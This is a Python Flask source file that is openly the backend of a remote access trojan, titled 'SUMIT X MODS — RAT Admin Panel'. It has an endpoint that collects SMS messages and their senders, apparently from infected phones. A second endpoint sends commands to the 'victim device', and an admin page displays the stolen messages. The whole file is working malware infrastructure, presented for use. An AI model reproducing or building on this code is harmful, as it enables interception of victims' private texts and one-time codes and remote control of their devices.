# app.py
from flask import Flask, request, jsonify, render_template_string
import json
from datetime import datetime

app = Flask(__name__)

# In-memory storage (production mein database use kar)
sms_logs = []
terminal_logs = []

# ─── ENDPOINT 1: SMS RECEIVE ───
@app.route('/send12', methods=['POST'])
def send12():
    try:
        data = request.get_json()
        sender = data.get('sender', 'Unknown')
        message = data.get('message', '')
        
        log = {
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'sender': sender,
            'message': message
        }
        sms_logs.append(log)
        
        # Telegram pe bhejo (optional)
        # send_to_telegram(sender, message)
        
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

# ─── ENDPOINT 2: TERMINAL SHOW ───
@app.route('/terminalshow1', methods=['GET'])
def terminalshow1():
    try:
        # Victim device ko command bhejo
        command = {
            'cmd': 'ping',
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        terminal_logs.append(command)
        return jsonify({'status': 'ok', 'command': command}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'msg': str(e)}), 500

# ─── ADMIN PANEL ───
@app.route('/')
def admin():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>SUMIT X MODS — Admin Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { background: #0a0a0a; color: #0f0; font-family: monospace; padding: 20px; }
            h1 { color: #f00; }
            .log { background: #111; padding: 10px; margin: 5px 0; border-left: 3px solid #0f0; }
            .sender { color: #ff0; }
            .time { color: #888; font-size: 12px; }
        </style>
    </head>
    <body>
        <h1>🎯 SUMIT X MODS — RAT Admin Panel</h1>
        <h2>SMS Logs ({{ sms_count }})</h2>
        {% for log in sms_logs %}
        <div class="log">
            <div class="time">{{ log.time }}</div>
            <div class="sender">📱 {{ log.sender }}</div>
            <div class="message">{{ log.message }}</div>
        </div>
        {% endfor %}
        
        <h2>Terminal Logs ({{ terminal_count }})</h2>
        {% for log in terminal_logs %}
        <div class="log">
            <div class="time">{{ log.time }}</div>
            <div class="message">💻 {{ log.cmd }}</div>
        </div>
        {% endfor %}
    </body>
    </html>
    """
    return render_template_string(
        html,
        sms_logs=sms_logs,
        terminal_logs=terminal_logs,
        sms_count=len(sms_logs),
        terminal_count=len(terminal_logs)
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)